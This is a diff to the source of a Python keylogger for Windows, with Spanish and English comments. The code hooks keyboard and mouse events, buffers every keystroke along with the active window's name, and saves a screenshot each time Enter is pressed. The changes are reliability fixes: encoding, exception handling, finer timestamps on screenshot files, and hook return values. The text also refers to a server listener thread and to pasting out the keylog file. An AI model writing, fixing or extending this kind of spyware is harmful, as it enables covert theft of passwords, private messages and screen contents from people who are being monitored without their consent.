@@ -237,20 +237,23 @@ class ServerListenerThread(threading.Thread):
 # log_level = logging.DEBUG, logging.INFO, logging.WARNING, logging.ERROR, logging.CRITICAL
 # verbose_level = 0, 1, 2, 3
 def log_verbose(msg, log_level, verbose_level):
-    if log_level == logging.DEBUG:
-        logging.debug(msg)
-    elif log_level == logging.INFO:
-        logging.info(msg)
-    elif log_level == logging.WARNING:
-        logging.warning(msg)
-    elif log_level == logging.ERROR:
-        logging.error(msg)
-    elif log_level == logging.CRITICAL:
-        logging.critical(msg)
+    try:
+        msg = msg.encode('utf-8')
+        if log_level == logging.DEBUG:
+            logging.debug(msg)
+        elif log_level == logging.INFO:
+            logging.info(msg)
+        elif log_level == logging.WARNING:
+            logging.warning(msg)
+        elif log_level == logging.ERROR:
+            logging.error(msg)
+        elif log_level == logging.CRITICAL:
+            logging.critical(msg)
 
-    if verbose >= verbose_level:
-        print(msg)
-    pass
+        if verbose >= verbose_level:
+            print(msg)
+    except Exception as ex:
+        print("Exception %s " % (ex))
 
 
 # función que hace "paste" del contenido del fichero de keylog
@@ -351,7 +354,7 @@ def register_window_name(text):
 def capture_screen():
     global key_buffer
     tmp_folder = tempfile.gettempdir() + '\\'
-    screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M") + SCREXT
+    screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M%S") + SCREXT
     key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
     pantalla = ScreenShootThread(screen_file)
     threadList.append(pantalla)
@@ -448,13 +451,13 @@ def add_key_to_buffer(event):
             # With each press of RETURN add the line break and take a screenshot.
             if ckey == '[ENTER]' or ckey == '[RETURN]':
                 ckey += CRLF
+                key_buffer += ckey
                 capture_screen()
         else:
             ckey = ''
     else:
         ckey = chr(key)
-
-    key_buffer += ckey
+        key_buffer += ckey
 
     # incrementa contador de teclas (de momento sin uso definido) - inc key counter. without use at the moment
     if len(ckey) > 0:
@@ -478,51 +481,55 @@ def on_mouse_event(event):
         register_window_name(repr(event.WindowName))
 
     old_event = event
-
+    return 1            # IMPORTANT. An integer other than 0 must be returned
 
 # control eventos de teclado
 def on_keyboard_event(event):
     global key_buffer, key_counter, old_event
 
-    # Logging and verbose (for debug) of keystrokes and related info
-    msg = 'Time: ' + repr(event.Time)
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'Ascii: ' + repr(event.Ascii) + repr(chr(event.Ascii))
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended)
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt)
-    log_verbose(msg, logging.DEBUG, 3)
-    msg = 'Transition: ' + repr(event.Transition)
-    log_verbose(msg, logging.DEBUG, 3)
+    try:
+        # Logging and verbose (for debug) of keystrokes and related info
+        msg = 'Time: ' + repr(event.Time)
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii))
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended)
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt)
+        log_verbose(msg, logging.DEBUG, 3)
+        msg = 'Transition: ' + repr(event.Transition)
+        log_verbose(msg, logging.DEBUG, 3)
 
-    # Si presiona combinación especial para salir y desactivar el KeyLogger
-    # If especial key to close keylogger is pressed
-    if event.Ascii == KEYCODE_EXIT:
-        msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
-        log_verbose(msg, logging.INFO, 2)
-        key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
-        sys.exit(0)
+        # Si presiona combinación especial para salir y desactivar el KeyLogger
+        # If especial key to close keylogger is pressed
+        if event.Ascii == KEYCODE_EXIT:
+            msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
+            log_verbose(msg, logging.INFO, 2)
+            key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
+            sys.exit(0)
 
-    # Si el usuario cambia de ventana, la registra
-    # If user change active window
-    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
-        register_window_name(repr(event.WindowName))
+        # Si el usuario cambia de ventana, la registra
+        # If user change active window
+        if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
+            register_window_name(repr(event.WindowName))
 
-    # guarda caracter en el buffer - save key to buffer
-    add_key_to_buffer(event)
+        # guarda caracter en el buffer - save key to buffer
+        add_key_to_buffer(event)
 
-    # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
-    # o saber si se cambia de ventana.
-    # Saves current event info to compare with next one.
-    old_event = event
+        # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
+        # o saber si se cambia de ventana.
+        # Saves current event info to compare with next one.
+        old_event = event
+    except Exception as ex:
+        print("Exception %s " % (ex))
 
+    return 1            # IMPORTANT. An integer other than 0 must be returned
 
 # Función que ejecutará al cerrar el programa - Whe program is closed
 def on_close_program():
